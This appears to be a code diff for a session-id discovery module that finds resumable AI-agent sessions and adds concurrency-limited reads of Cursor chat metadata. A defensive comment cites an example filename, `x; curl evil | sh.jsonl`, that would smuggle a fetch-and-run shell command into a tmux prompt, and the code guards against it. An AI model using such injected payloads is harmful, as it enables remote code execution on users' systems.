@@ -19,6 +19,9 @@ import type { AgentProviderType } from "@/types/session";
 import type { ResumableSessionSummary } from "@/types/agent-resume";
 import { getResumeSpec } from "./agent-resume-registry";
 import { listSessions } from "@/services/claude-session-service";
+import { createLogger } from "@/lib/logger";
+
+const log = createLogger("SessionIdDiscovery");
 
 /** One discovered native session id with its last-modified time. */
 export interface DiscoveredSessionId {
@@ -54,9 +57,9 @@ function stripExtension(name: string, exts: string[]): string {
  * [hgwo] Defense-in-depth: a discovered id (a readdir filename stem for
  * codex/gemini/opencode/cursor) is later typed into the shell prompt via
  * `tmux send-keys -l <cmd>` + `C-m`, so a session file named e.g.
- * `x; curl evil | sh.jsonl` would inject a command. The discovery dir is the
- * user's own profile-isolated home (low likelihood), but we still reject any id
- * with shell-significant characters — only `[A-Za-z0-9._-]` is allowed. Claude's
+ * `x; curl evil | sh.jsonl` would inject a command. The discovery stores are
+ * user-writable (profile-scoped for some providers, shared for Cursor), so we
+ * reject any id with shell-significant characters — only `[A-Za-z0-9._-]` is allowed. Claude's
  * UUIDs and the providers' opaque ids pass; a non-matching id is skipped so the
  * caller relaunches FRESH instead of resuming with an unsafe id.
  */
@@ -66,10 +69,39 @@ function isSafeSessionId(id: string): boolean {
   return id.length > 0 && SAFE_SESSION_ID.test(id);
 }
 
+/** Map without opening every file in a large chat index at once. */
+async function mapWithConcurrency<T, R>(
+  items: T[],
+  limit: number,
+  mapper: (item: T) => Promise<R>,
+): Promise<R[]> {
+  const results = new Array<R>(items.length);
+  let nextIndex = 0;
+  const worker = async () => {
+    while (nextIndex < items.length) {
+      const index = nextIndex++;
+      results[index] = await mapper(items[index]);
+    }
+  };
+  await Promise.all(
+    Array.from({ length: Math.min(limit, items.length) }, () => worker()),
+  );
+  return results;
+}
+
 /** Resolve Cursor's data root. CLI config overrides do not relocate chat data. */
 function resolveCursorDataDir(env: Record<string, string>): string {
   if (env.CURSOR_DATA_DIR) return env.CURSOR_DATA_DIR;
   return join(env.HOME ?? homedir(), ".cursor");
+}
+
+/** Whether a millisecond timestamp can be losslessly rendered as ISO. */
+function isValidDateMs(value: unknown): value is number {
+  return (
+    typeof value === "number" &&
+    Number.isFinite(value) &&
+    !Number.isNaN(new Date(value).getTime())
+  );
 }
 
 /**
@@ -89,45 +121,77 @@ async function listCursorSessionIds(
   const chatsDir = join(resolveCursorDataDir(env), "chats");
 
   try {
-    const workspaceBuckets = (await readdir(chatsDir)).filter(isSafeSessionId);
-    const perWorkspace = await Promise.all(
-      workspaceBuckets.map(async (workspaceBucket) => {
+    // Workspace bucket names are opaque index keys and are never typed into a
+    // shell, so the chat-id injection guard must not filter them.
+    const workspaceBuckets = await readdir(chatsDir);
+    const perWorkspace = await mapWithConcurrency(
+      workspaceBuckets,
+      16,
+      async (workspaceBucket) => {
         const workspaceDir = join(chatsDir, workspaceBucket);
         try {
           const chatIds = (await readdir(workspaceDir)).filter(isSafeSessionId);
-          return Promise.all(
-            chatIds.map(async (sessionId) => {
-              const metadataPath = join(workspaceDir, sessionId, "meta.json");
-              try {
-                const parsed: unknown = JSON.parse(await readFile(metadataPath, "utf8"));
-                if (!parsed || typeof parsed !== "object") return null;
-
-                const metadata = parsed as Record<string, unknown>;
-                if (metadata.cwd !== cwd || metadata.hasConversation !== true) return null;
-
-                const updatedAtMs =
-                  typeof metadata.updatedAtMs === "number" &&
-                  Number.isFinite(metadata.updatedAtMs)
-                    ? metadata.updatedAtMs
-                    : typeof metadata.createdAtMs === "number" &&
-                        Number.isFinite(metadata.createdAtMs)
-                      ? metadata.createdAtMs
-                      : (await stat(metadataPath)).mtimeMs;
-
-                return { sessionId, mtime: updatedAtMs };
-              } catch {
-                return null;
-              }
-            }),
-          );
+          return chatIds.map((sessionId) => ({ workspaceDir, sessionId }));
         } catch {
           return [];
         }
-      }),
+      },
+    );
+    const candidates = perWorkspace.flat();
+    const metadataEntries = await mapWithConcurrency(
+      candidates,
+      32,
+      async ({ workspaceDir, sessionId }) => {
+        const metadataPath = join(workspaceDir, sessionId, "meta.json");
+        try {
+          const parsed: unknown = JSON.parse(await readFile(metadataPath, "utf8"));
+          if (!parsed || typeof parsed !== "object") {
+            return { recognized: false, entry: null };
+          }
+
+          const metadata = parsed as Record<string, unknown>;
+          if (
+            typeof metadata.cwd !== "string" ||
+            typeof metadata.hasConversation !== "boolean"
+          ) {
+            return { recognized: false, entry: null };
+          }
+          if (metadata.cwd !== cwd || metadata.hasConversation !== true) {
+            return { recognized: true, entry: null };
+          }
+
+          const updatedAtMs =
+            isValidDateMs(metadata.updatedAtMs)
+              ? metadata.updatedAtMs
+              : isValidDateMs(metadata.createdAtMs)
+                ? metadata.createdAtMs
+                : (await stat(metadataPath)).mtimeMs;
+
+          if (!isValidDateMs(updatedAtMs)) {
+            return { recognized: true, entry: null };
+          }
+
+          return {
+            recognized: true,
+            entry: { sessionId, mtime: updatedAtMs },
+          };
+        } catch {
+          return { recognized: false, entry: null };
+        }
+      },
     );
 
-    return perWorkspace
-      .flat()
+    if (
+      candidates.length > 0 &&
+      metadataEntries.every((result) => !result.recognized)
+    ) {
+      log.warn("Cursor chat metadata was unreadable or had an unknown schema", {
+        candidateCount: candidates.length,
+      });
+    }
+
+    return metadataEntries
+      .map((result) => result.entry)
       .filter((entry): entry is { sessionId: string; mtime: number } => entry !== null)
       .sort((a, b) => b.mtime - a.mtime)
       .map(({ sessionId, mtime }) => ({
